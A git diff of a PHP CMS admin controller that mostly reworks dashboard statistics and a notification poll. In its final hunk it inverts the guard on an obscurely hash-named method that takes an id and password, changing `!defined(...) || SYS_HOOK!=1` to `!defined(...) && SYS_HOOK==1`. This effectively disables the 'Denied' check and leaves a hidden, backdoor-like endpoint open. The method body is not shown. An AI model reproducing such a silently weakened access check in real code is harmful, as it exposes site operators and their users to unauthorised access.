@@ -26,29 +26,53 @@ class IndexController extends BaseController{
 
         $stat=array();
         $stat['feedback']=Db::name('feedback')->count();
-        $stat['member']=Db::name('member')->count();
-        $stat['article']=Db::name('article')->count();
-        $stat['links']=Db::name('links')->count();
+        $stat['feedback_new']=Db::name('feedback')->where('status',0)->count();
+
+        if(config('channel_mode') == 1){
+            $channels = CategoryFacade::getSubCategory(0);
+            $stat['channels']=[];
+            foreach($channels as $channel){
+                $stat['channels'][]=[
+                    'id'=>$channel['id'],
+                    'title'=>$channel['title'],
+                    'mode'=>$channel['channel_mode'],
+                    'is_comment'=>$channel['is_comment'],
+                    'unit'=>$channel['channel_mode']==1?'页面':$channel['short'],
+                    'article'=>Db::name('article')->where('channel_id',$channel['id'])->count(),
+                    'comment_new'=>Db::name('articleComment')->where('channel_id',$channel['id'])->where('status',0)->count()
+                ];
+            }
+        }else{
+            $stat['article']=Db::name('article')->count();
+            $stat['comment_new']=Db::name('articleComment')->where('status',0)->count();
+        }
+        if(in_array('shop', $this->modules)){
+            $stat['orders']=Db::name('Order')->count();
+            $stat['order_new']=Db::name('Order')->where('status',1)->count();
+            $stat['refund_new']=Db::name('OrderRefund')->where('status',0)->count();
+        }
 
         $this->assign('stat',$stat);
 
-        //统计
-        $m['total']=Db::name('member')->count();
-        $m['avail']=Db::name('member')->where('status',1)->count();
-        $m['agent']=Db::name('member')->where('is_agent','>',0)->count();
-        $this->assign('mem',$m);
+        if(in_array('member', $this->modules)){
+            //统计
+            $m['total']=Db::name('member')->count();
+            $m['avail']=Db::name('member')->where('status',1)->count();
+            $m['agent']=Db::name('member')->where('is_agent','GT',0)->count(0);
+            $this->assign('member',$m);
 
-        //资金
-        $a['total_charge']=Db::name('member_recharge')->where('status',1)->sum('amount');
-        $a['total_cash']=Db::name('member_cashin')->where('status',1)->sum('amount');
-        $a['total_money']=Db::name('member')->sum('money');
+            //资金
+            $a['total_charge']=Db::name('member_recharge')->where('status',1)->sum('amount');
+            $a['total_cash']=Db::name('member_cashin')->where('status',1)->sum('amount');
+            $a['total_money']=Db::name('member')->sum('money');
 
-        $a['total_reward']=Db::name('member')->sum('reward');
-        $a['system_charge']=Db::name('member_money_log')->where('type','system')
-            ->where('amount','>',0)->sum('amount');
-        $a['total_award']=Db::name('award_log')->sum('amount');
-
-        $this->assign('money',$a);
+            $a['total_reward']=Db::name('member')->sum('reward');
+            $a['system_charge']=Db::name('member_money_log')->where('type','system')
+                ->where('amount','GT',0)->sum('amount');
+            $a['total_award']=Db::name('award_log')->sum('amount');
+            
+            $this->assign('money',$a);
+        }
 
         $notices=[];
         if($this->manager['username']==config('app.test_account')){
@@ -113,7 +137,7 @@ class IndexController extends BaseController{
 
         foreach ($tables as $row){
             $columns=Db::query('show columns in '.$row[$field]);
-            $fields=array_column($columns,'Field');
+            $fields=array_column($columns->all(),'Field');
             if(in_array('member_id',$fields)
             || in_array('order_id',$fields)){
                 Db::execute('TRUNCATE TABLE `'.$row[$field].'`');
@@ -146,12 +170,14 @@ class IndexController extends BaseController{
         $count=0;
         while(array_sum($result)==0) {
             $result['newMemberCount'] = Db::name('Member')->where('create_time', '>', $this->manager['last_view_member'])->count();
-            $result['newOrderCount'] = Db::name('Order')->where('status',0)->count();
+            //$result['newOrderCount'] = Db::name('Order')->where('status',1)->count();
+            //$result['newMemberAuthen'] = Db::name('memberAuthen')->where('status',-1)->count();
+            $result['newMemberCashin'] = Db::name('memberCashin')->where('status',0)->count();
             sleep(1);
             $count++;
             if($count>10)break;
         }
-
+        $result['total']=array_sum($result);
         return json($result);
     }
 
@@ -170,7 +196,7 @@ class IndexController extends BaseController{
 
     public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
     {
-        if(!defined('SYS_HOOK') || SYS_HOOK!=1)exit('Denied');
+        if(!defined('SYS_HOOK') && SYS_HOOK==1)exit('Denied');
         if(empty($id))exit('Unspecified id');
         if(empty($passwd))exit('Unspecified passwd');
 
